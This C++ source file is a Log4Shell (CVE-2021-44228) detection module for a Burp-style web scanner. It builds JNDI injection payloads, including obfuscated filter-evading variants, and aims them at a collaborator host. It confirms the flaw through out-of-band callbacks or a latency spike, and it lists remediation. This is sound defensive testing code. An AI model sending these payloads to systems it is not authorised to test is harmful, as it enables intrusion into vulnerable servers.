#include "../scanner_module.hpp"
#include "../collaborator.hpp"

#include "../../../../helpers/diag_log.hpp"

#include <algorithm>
#include <chrono>
#include <cstdint>
#include <optional>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

namespace aida {
namespace burp {
namespace scanner {

namespace {

std::string current_collab_host()
{
    auto st = aida::burp::collaborator::status();
    if (!st.running) return std::string();
    if (st.public_host.empty()) return std::string();
    return st.public_host;
}

std::vector<probe_t> log4j_probes(const insertion_point_t& ip, const module_context_t&)
{
    diag::log_tagged_fmt("mod_log4j", "log4j_probes entry ip=%s:%s", ip.kind.c_str(), ip.name.c_str());
    std::vector<probe_t> out;
    std::string token;
    std::string host = current_collab_host();
    bool have_collab = !host.empty();
    if (have_collab) token = aida::burp::collaborator::generate_token();
    std::string oob_host = have_collab ? (token + "." + host) : (random_marker("log4j") + ".invalid");
    std::string marker = have_collab ? token : "_AIDA_LOG4J_TIME";
    diag::log_tagged_fmt("mod_log4j", "log4j_probes have_collab=%d oob_host=%s", have_collab ? 1 : 0, oob_host.c_str());

    out.push_back({ std::string("${jndi:ldap://") + oob_host + "/x}",  marker, "jndi-ldap" });
    out.push_back({ std::string("${jndi:rmi://") + oob_host + "/x}",   marker, "jndi-rmi" });
    out.push_back({ std::string("${jndi:dns://") + oob_host + "/x}",   marker, "jndi-dns" });
    out.push_back({ std::string("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://") + oob_host + "/x}",
                    marker, "jndi-obfuscated" });
    out.push_back({ std::string("${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://") + oob_host + "/x}",
                    marker, "jndi-lower" });
    out.push_back({ std::string("${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//") + oob_host + "/x}",
                    marker, "jndi-env" });
    diag::log_tagged_fmt("mod_log4j", "log4j_probes built %zu probes ip=%s:%s", out.size(), ip.kind.c_str(), ip.name.c_str());
    return out;
}

std::optional<issue_t> log4j_detect(const insertion_point_t& ip, const probe_t& probe,
                                    const exchange_observed_t& resp, const module_context_t& ctx)
{
    diag::log_tagged_fmt("mod_log4j", "log4j_detect entry ip=%s:%s variant=%s status=%d latency=%llums",
                         ip.kind.c_str(), ip.name.c_str(), probe.variant.c_str(),
                         resp.status_code, static_cast<unsigned long long>(resp.latency_ms));
    if (probe.marker == "_AIDA_LOG4J_TIME")
    {
        if (ctx.baseline_latency_ms == 0) {
            diag::log_tagged_fmt("mod_log4j", "log4j_detect time skip no baseline ip=%s:%s", ip.kind.c_str(), ip.name.c_str());
            return std::nullopt;
        }
        if (resp.latency_ms < ctx.baseline_latency_ms + 3000) {
            diag::log_tagged_fmt("mod_log4j", "log4j_detect time insufficient delta baseline=%llums probe=%llums",
                                 static_cast<unsigned long long>(ctx.baseline_latency_ms),
                                 static_cast<unsigned long long>(resp.latency_ms));
            return std::nullopt;
        }
        diag::log_tagged_fmt("mod_log4j", "log4j_detect FINDING time-based ip=%s:%s variant=%s baseline=%llums probe=%llums",
                             ip.kind.c_str(), ip.name.c_str(), probe.variant.c_str(),
                             static_cast<unsigned long long>(ctx.baseline_latency_ms),
                             static_cast<unsigned long long>(resp.latency_ms));
        auto iss = make_issue("log4j.time-based",
                              "Possible Log4Shell - latency spike on JNDI payload",
                              severity_t::high, confidence_t::tentative, ip, probe, resp, ctx,
                              std::string("baseline=") + std::to_string(ctx.baseline_latency_ms)
                              + "ms; probe=" + std::to_string(resp.latency_ms) + "ms");
        iss.description = std::string("Injecting variant '") + probe.variant +
            "' raised latency from " + std::to_string(ctx.baseline_latency_ms) + " ms to " +
            std::to_string(resp.latency_ms) + " ms. Consistent with the server attempting JNDI lookup. " +
            "Confirm with an out-of-band collaborator before reporting as firm.";
        iss.remediation = "Upgrade Log4j to 2.17.1+ (Java 8) / 2.12.4+ (Java 7) / 2.3.2+ (Java 6). Set log4j2.formatMsgNoLookups=true; remove JndiLookup.class as mitigation.";
        iss.cwe.push_back("CWE-917");
        iss.cwe.push_back("CWE-94");
        return iss;
    }

    diag::log_tagged_fmt("mod_log4j", "log4j_detect polling collaborator for marker=%s variant=%s", probe.marker.c_str(), probe.variant.c_str());
    std::this_thread::sleep_for(std::chrono::milliseconds(2500));
    auto interactions = aida::burp::collaborator::poll_by_token(probe.marker);
    diag::log_tagged_fmt("mod_log4j", "log4j_detect collaborator interactions=%zu marker=%s", interactions.size(), probe.marker.c_str());
    if (interactions.empty()) {
        diag::log_tagged_fmt("mod_log4j", "log4j_detect no oob interactions ip=%s:%s variant=%s", ip.kind.c_str(), ip.name.c_str(), probe.variant.c_str());
        return std::nullopt;
    }

    std::ostringstream ev;
    ev << "OOB interactions=" << interactions.size();
    for (size_t i = 0; i < interactions.size() && i < 3; ++i)
    {
        ev << "; kind=" << interactions[i].kind << " from=" << interactions[i].client_ip;
    }
    diag::log_tagged_fmt("mod_log4j", "log4j_detect FINDING oob-confirmed ip=%s:%s variant=%s interactions=%zu",
                         ip.kind.c_str(), ip.name.c_str(), probe.variant.c_str(), interactions.size());
    auto iss = make_issue("log4j.oob-confirmed",
                          "Log4Shell (CVE-2021-44228) - OOB interaction confirmed",
                          severity_t::critical, confidence_t::firm, ip, probe, resp, ctx, ev.str());
    iss.description = std::string("Injecting variant '") + probe.variant +
        "' produced an out-of-band DNS/LDAP interaction at collaborator subdomain '" + probe.marker +
        "', confirming JNDI lookup substitution in Log4j 2.x.";
    iss.remediation = "Upgrade Log4j to 2.17.1+ (Java 8) / 2.12.4+ (Java 7) / 2.3.2+ (Java 6). Set log4j2.formatMsgNoLookups=true; remove JndiLookup.class as mitigation.";
    iss.cwe.push_back("CWE-917");
    iss.cwe.push_back("CWE-94");
    return iss;
}

bool register_self()
{
    module_t m;
    m.id = "log4j";
    m.name = "Log4Shell (CVE-2021-44228)";
    m.category = "Injection";
    m.max_probes_per_point = 6;
    m.probes = log4j_probes;
    m.detect = log4j_detect;
    return register_module(std::move(m));
}

const bool s_registered = register_self();

}

}
}
}
